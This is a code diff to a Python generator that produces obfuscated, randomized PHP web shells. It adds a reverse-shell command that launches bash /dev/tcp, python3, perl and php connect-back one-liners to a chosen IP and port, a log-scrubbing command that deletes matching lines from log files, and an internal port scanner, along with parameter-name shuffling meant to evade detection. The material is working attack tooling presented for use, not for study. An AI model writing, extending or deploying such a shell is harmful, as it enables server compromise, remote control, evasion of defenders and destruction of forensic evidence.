@@ -266,7 +266,7 @@ def compute_bcrypt_hash(password: str, cost: int = 12, seed: int = None) -> str:
 # defeat the substitution and fail the CI mimic check.
 MIMIC_PARAM_POOL = [
     'q','query','search','keyword','term','text','input','filter',
-    'dir','ctx','context','scope','ref','target','source',
+    'dir','ctx','context','scope','ref','source',
     'action','event','op','mode','view','sort','lang','locale',
     'data','payload','body','content','value','field','attr','prop',
     'token','nonce','sig','key','sid','fmt','charset','region',
@@ -278,6 +278,9 @@ def generate_transport_context(rng: random.Random, mode: str) -> dict:
             'p_cmd': 'cmd', 'p_cwd': 'cwd',
             'p_filename': 'filename', 'p_filetype': 'type',
             'p_path': 'path', 'p_file': 'file',
+            'p_ip': 'ip', 'p_port_rs': 'port',
+            'p_logfile': 'logfile', 'p_pattern': 'pattern',
+            'p_target': 'target', 'p_ports_ps': 'ports',
         }
     pool = list(MIMIC_PARAM_POOL)
     rng.shuffle(pool)
@@ -285,6 +288,9 @@ def generate_transport_context(rng: random.Random, mode: str) -> dict:
         'p_cmd': pool[0], 'p_cwd': pool[1],
         'p_filename': pool[2], 'p_filetype': pool[3],
         'p_path': pool[4], 'p_file': pool[5],
+        'p_ip': pool[6], 'p_port_rs': pool[7],
+        'p_logfile': pool[8], 'p_pattern': pool[9],
+        'p_target': pool[10], 'p_ports_ps': pool[11],
     }
     if mode == 'rc4':
         rc4_bytes = [rng.randint(0, 255) for _ in range(16)]
@@ -591,6 +597,12 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
     p_filetype = transport_ctx['p_filetype']
     p_path     = transport_ctx['p_path']
     p_file     = transport_ctx['p_file']
+    p_ip       = transport_ctx['p_ip']
+    p_port_rs  = transport_ctx['p_port_rs']
+    p_logfile  = transport_ctx['p_logfile']
+    p_pattern  = transport_ctx['p_pattern']
+    p_target   = transport_ctx['p_target']
+    p_ports_ps = transport_ctx['p_ports_ps']
 
     if transport == 'plain':
         def pdec(param, fallback=None):
@@ -741,6 +753,96 @@ def build_php_section(n, jv, ids, route_param, routes, session_key_val,
             f"                : ['stdout' => base64_encode('Missing parameters.'), 'cwd' => base64_encode(getcwd())];\n"
             f"            break;"
         ),
+        'revshell': "\n".join([
+            f"        case '{routes['revshell']}':",
+            f"            $__ip   = {pdec(p_ip)};",
+            f"            $__port = (int)({pdec(p_port_rs)});",
+            "            if (!filter_var($__ip, FILTER_VALIDATE_IP) || $__port < 1 || $__port > 65535) {",
+            "                $response = ['stdout' => base64_encode('Usage: revshell <IP> <PORT>'), 'cwd' => base64_encode(getcwd())];",
+            "                break;",
+            "            }",
+            "            $__sent = null;",
+            "            $__cmds = [",
+            "                'bash'    => 'bash -c \\'bash -i >& /dev/tcp/' . $__ip . '/' . $__port . ' 0>&1\\'',",
+            "                'python3' => 'python3 -c \"import socket,os,pty,subprocess;s=socket.socket();s.connect((\\\"\" . $__ip . \"\\\",\" . $__port . \"));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\\\"/bin/sh\\\"])\"',",
+            "                'perl'    => 'perl -MSocket -e \\'$i=\"' . $__ip . '\";$p=' . $__port . ';socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh\");\\'',",
+            "                'php'     => 'php -r \\'$s=fsockopen(\"' . $__ip . '\",$__port);$p=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$x);\\'',",
+            "            ];",
+            "            foreach ($__cmds as $__bin => $__cmd) {",
+            "                if (@shell_exec('which ' . escapeshellarg($__bin) . ' 2>/dev/null')) {",
+            "                    if (function_exists('proc_open')) {",
+            "                        $__d = []; proc_close(proc_open($__cmd . ' >/dev/null 2>&1 &', $__d, $__px));",
+            "                    } else { exec($__cmd . ' >/dev/null 2>&1 &'); }",
+            "                    $__sent = $__bin; break;",
+            "                }",
+            "            }",
+            "            $__out = $__sent",
+            "                ? 'Reverse shell sent via ' . $__sent . ' to ' . $__ip . ':' . $__port . \"\\nEnsure your listener: nc -lvnp \" . $__port",
+            "                : 'No suitable binary found (tried bash, python3, perl, php).';",
+            "            $response = ['stdout' => base64_encode($__out), 'cwd' => base64_encode(getcwd())];",
+            "            break;",
+        ]),
+        'clearlog': "\n".join([
+            f"        case '{routes['clearlog']}':",
+            f"            $__lf = {pdec(p_logfile)};",
+            f"            $__pt = {pdec(p_pattern)};",
+            "            if (!$__lf || !$__pt) {",
+            "                $response = ['stdout' => base64_encode('Usage: clearlog <file> <pattern>'), 'cwd' => base64_encode(getcwd())];",
+            "                break;",
+            "            }",
+            "            if (!is_readable($__lf) || !is_writable($__lf)) {",
+            "                $response = ['stdout' => base64_encode(\"Error: {$__lf} not readable/writable\"), 'cwd' => base64_encode(getcwd())];",
+            "                break;",
+            "            }",
+            "            $__lines  = file($__lf, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);",
+            "            $__before = count($__lines);",
+            "            $__re     = '/' . str_replace('/', '\\\\/', $__pt) . '/i';",
+            "            $__filt   = array_values(array_filter($__lines, function($__l) use ($__re) { return !preg_match($__re, $__l); }));",
+            "            file_put_contents($__lf, $__filt ? implode(\"\\n\", $__filt) . \"\\n\" : '');",
+            "            $__rm = $__before - count($__filt);",
+            "            $response = ['stdout' => base64_encode(\"Removed {$__rm}/{$__before} lines matching '{$__pt}' from {$__lf}\"), 'cwd' => base64_encode(getcwd())];",
+            "            break;",
+        ]),
+        'portscan': "\n".join([
+            f"        case '{routes['portscan']}':",
+            f"            $__tg = trim({pdec(p_target)});",
+            f"            $__ps = trim({pdec(p_ports_ps)});",
+            "            if (!$__tg || !$__ps) {",
+            "                $response = ['stdout' => base64_encode('Usage: portscan <ip[-lastoctet]> <port[,port|port-port]>'), 'cwd' => base64_encode(getcwd())];",
+            "                break;",
+            "            }",
+            "            $__ips = [];",
+            "            if (preg_match('/^(\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.\\\\d{1,3}\\\\.)+(\\\\d{1,3})-(\\\\d{1,3})$/', $__tg, $__rm2)) {",
+            "                for ($__i = (int)$__rm2[2]; $__i <= min((int)$__rm2[3], 254) && count($__ips) < 255; $__i++) $__ips[] = $__rm2[1].$__i;",
+            "            } else { $__ips[] = $__tg; }",
+            "            $__ports = [];",
+            "            foreach (explode(',', $__ps) as $__chunk) {",
+            "                $__chunk = trim($__chunk);",
+            "                if (strpos($__chunk, '-') !== false) {",
+            "                    [$__s, $__e] = explode('-', $__chunk, 2);",
+            "                    for ($__p = (int)$__s; $__p <= min((int)$__e, 65535) && count($__ports) < 100; $__p++) $__ports[] = $__p;",
+            "                } else { $__ports[] = (int)$__chunk; }",
+            "            }",
+            "            $__ports = array_unique(array_filter($__ports, fn($__p) => $__p > 0 && $__p <= 65535));",
+            "            sort($__ports);",
+            "            if (count($__ips) * count($__ports) > 500) {",
+            "                $response = ['stdout' => base64_encode('Scan too large (max 500 host:port pairs). Reduce range or port list.'), 'cwd' => base64_encode(getcwd())];",
+            "                break;",
+            "            }",
+            "            $__open = []; $__chk = 0;",
+            "            foreach ($__ips as $__ip) {",
+            "                foreach ($__ports as $__port) {",
+            "                    $__sock = @fsockopen($__ip, $__port, $__en, $__es, 0.3);",
+            "                    if ($__sock) { $__open[] = \"{$__ip}:{$__port}\"; fclose($__sock); }",
+            "                    $__chk++;",
+            "                }",
+            "            }",
+            "            $__out2 = count($__open)",
+            "                ? 'Open (' . count($__open) . \"/$__chk):\\n\" . implode(\"\\n\", $__open)",
+            "                : \"No open ports ($__chk host:port pairs checked).\";",
+            "            $response = ['stdout' => base64_encode($__out2), 'cwd' => base64_encode(getcwd())];",
+            "            break;",
+        ]),
     }
     switch_body = "\n".join(case_blocks[c] for c in case_order)
 
@@ -1020,6 +1122,7 @@ if (!{n['is_session']}()) {{
             usleep(random_int(400000, 700000));
         }}
     }}
+    header('Content-Type: text/html; charset=utf-8');
 ?>
 <!DOCTYPE html>
 <html>
@@ -1081,6 +1184,7 @@ if (isset($_GET['{route_param}'])) {{
     exit;
 }} else {{
     {n['get_env_info']}();
+    header('Content-Type: text/html; charset=utf-8');
 }}
 ?>
 <!DOCTYPE html>
@@ -1124,6 +1228,11 @@ if (isset($_GET['{route_param}'])) {{
             return str.replace(/&/g,"&amp;").replace(/</g,"&lt;")
                       .replace(/>/g,"&gt;").replace(/"/g,"&quot;")
                       .replace(/'/g,"&#39;");
+        }}
+
+        function {jfn['b64u']}(s) {{
+            if (!s) return '';
+            try {{ return decodeURIComponent(escape(atob(s))); }} catch(e) {{ return atob(s); }}
         }}
 
         function {jfn['get_header']}(cwd) {{
@@ -1185,7 +1294,7 @@ if (isset($_GET['{route_param}'])) {{
             var nc = (typeof cwd === "string" && cwd.trim()) ? cwd : null;
             if (nc) {{ {jfn['cwd']} = nc; {jfn['update_meta']}(); return; }}
             {jfn['pipe_call']}("?{route_param}={routes['pwd']}", {{}}, function(r) {{
-                {jfn['cwd']} = (r && r.cwd) ? atob(r.cwd) : "~";
+                {jfn['cwd']} = (r && r.cwd) ? {jfn['b64u']}(r.cwd) : "~";
                 {jfn['update_meta']}();
             }});
         }}
@@ -1231,8 +1340,8 @@ if (isset($_GET['{route_param}'])) {{
                 if (!f) {{ {jfn['insert_stdout']}("Upload cancelled."); document.body.removeChild(inp); return; }}
                 {jfn['file_to_stream']}(f).then(function(b64) {{
                     {jfn['pipe_call']}("?{route_param}={routes['upload']}", {{path: path, file: b64, cwd: {jfn['cwd']}}}, function(r) {{
-                        {jfn['insert_stdout']}(atob(r.stdout || ""));
-                        {jfn['refresh_scope']}(atob(r.cwd || ""));
+                        {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
+                        {jfn['refresh_scope']}({jfn['b64u']}(r.cwd || ""));
                     }});
                 }}).catch(function() {{
                     {jfn['insert_stdout']}("Upload failed: client error.");
@@ -1246,16 +1355,38 @@ if (isset($_GET['{route_param}'])) {{
         function {jfn['resolve_task']}(command) {{
             if (typeof command !== "string" || !command.trim()) return;
             {jfn['append_line']}(command);
+            var _rsm = command.match(/^\\s*revshell\\s+(\\S+)\\s+(\\d+)\\s*$/i);
+            if (_rsm) {{
+                {jfn['pipe_call']}("?{route_param}={routes['revshell']}", {{{p_ip}: _rsm[1], {p_port_rs}: _rsm[2]}}, function(r) {{
+                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
+                }});
+                return;
+            }}
+            var _clm = command.match(/^\\s*clearlog\\s+(\\S+)\\s+(.+?)\\s*$/i);
+            if (_clm) {{
+                {jfn['pipe_call']}("?{route_param}={routes['clearlog']}", {{{p_logfile}: _clm[1], {p_pattern}: _clm[2]}}, function(r) {{
+                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
+                }});
+                return;
+            }}
+            var _psm = command.match(/^\\s*portscan\\s+(\\S+)\\s+(\\S+)\\s*$/i);
+            if (_psm) {{
+                {jfn['insert_stdout']}("Scanning...");
+                {jfn['pipe_call']}("?{route_param}={routes['portscan']}", {{{p_target}: _psm[1], {p_ports_ps}: _psm[2]}}, function(r) {{
+                    {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
+                }});
+                return;
+            }}
             var m = command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/);
             if (m) {{ {jfn['trigger_export']}(m[1]); return; }}
             if (/^\\s*clear\\s*$/.test(command)) {{ {jfn['e_content']}.innerHTML = ''; return; }}
             {jfn['pipe_call']}("?{route_param}={routes['shell']}", {{cmd: command, cwd: {jfn['cwd']}}}, function(r) {{
                 if (r && typeof r === "object") {{
                     if (r.hasOwnProperty('file')) {{
-                        {jfn['save_blob']}(atob(r.name), r.file);
+                        {jfn['save_blob']}({jfn['b64u']}(r.name), r.file);
                     }} else {{
-                        {jfn['insert_stdout']}(atob(r.stdout || ""));
-                        {jfn['refresh_scope']}(atob(r.cwd || ""));
+                        {jfn['insert_stdout']}({jfn['b64u']}(r.stdout || ""));
+                        {jfn['refresh_scope']}({jfn['b64u']}(r.cwd || ""));
                     }}
                 }} else {{
                     {jfn['insert_stdout']}("Invalid response.");
@@ -1271,7 +1402,7 @@ if (isset($_GET['{route_param}'])) {{
             var fname = (type === "cmd") ? parts[0] : parts[parts.length - 1];
             {jfn['pipe_call']}("?{route_param}={routes['hint']}", {{filename: fname, cwd: {jfn['cwd']}, type: type}}, function(d) {{
                 if (!d || !Array.isArray(d.files) || d.files.length <= 1) return;
-                var decoded = d.files.map(function(f) {{ return atob(f); }});
+                var decoded = d.files.map(function(f) {{ return {jfn['b64u']}(f); }});
                 if (decoded.length === 2) {{
                     {jfn['e_input']}.value = (type === "cmd") ? decoded[0] : val.replace(/([^\\s]*)$/, decoded[0]);
                 }} else {{
@@ -1398,10 +1529,13 @@ def generate(args):
     # Routing tokens
     route_param = rnd_token(rng, 6)
     routes = {
-        'shell':  rnd_token(rng, 7),
-        'pwd':    rnd_token(rng, 7),
-        'hint':   rnd_token(rng, 7),
-        'upload': rnd_token(rng, 7),
+        'shell':    rnd_token(rng, 7),
+        'pwd':      rnd_token(rng, 7),
+        'hint':     rnd_token(rng, 7),
+        'upload':   rnd_token(rng, 7),
+        'revshell': rnd_token(rng, 7),
+        'clearlog': rnd_token(rng, 7),
+        'portscan': rnd_token(rng, 7),
     }
     session_key_val = rnd_token(rng, 14)
 
@@ -1437,7 +1571,7 @@ def generate(args):
     jv = {}
     for key in ['append_line','insert_stdout','pipe_call','resolve_task','suggest_entry',
                 'save_blob','trigger_export','file_to_stream','get_header','refresh_scope',
-                'neutralize_html','update_meta','dispatch_key','cache_query']:
+                'neutralize_html','update_meta','dispatch_key','cache_query','b64u']:
         jv[key] = pick(JS_FUNC_POOL, used_js, rng)
 
     used_jv = set()
@@ -1460,7 +1594,7 @@ def generate(args):
     junk_after  = all_junk[mid:]
 
     # Case order
-    case_order = ['shell','pwd','hint','upload']
+    case_order = ['shell','pwd','hint','upload','revshell','clearlog','portscan']
     rng.shuffle(case_order)
 
     # Version
